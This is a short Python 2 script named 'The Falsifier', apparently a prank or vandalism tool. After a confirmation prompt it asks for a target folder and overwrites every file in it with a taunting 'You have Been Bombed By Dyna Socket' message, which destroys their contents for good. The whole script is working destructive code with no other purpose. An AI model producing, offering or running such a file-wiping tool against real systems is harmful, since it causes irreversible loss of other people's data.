#!/usr/bin/env python

import glob,sys,os

print "-"*60
print "Welcome To The Falsifier"
print "-"*60
        
perm = input("""\nWarning - Any Changes Made To The Files Will Not Be Reverted.
Also Any Non-Text File Will Be Corrupted.
Are You Sure You Want To Continue ?(Y/N) - """)

try:
    if perm == "Y" or perm == "y":
        target = input("\nEnter You Target Folder : ")
        print
        empty = []
        for file in glob.glob(target + "/*"):
            print "Scanning " + file
            empty.append(file)
            
        for name in empty:
            filename = open(name,"w")
            filename.write("You have Been Bombed By Dyna Socket.\n")
            filename.write("It is Okay! Shit Happens ! Better Luck Next Time Grasshopper. ;)")
            filename.close()
        
        print
        print "-"*60
        print "Operation Complete."
        print "-"*60
        print
        os.system("pause")
    else:
        sys.exit()
except Exception, e:
    print "Error : " + str(e)
    sys.exit()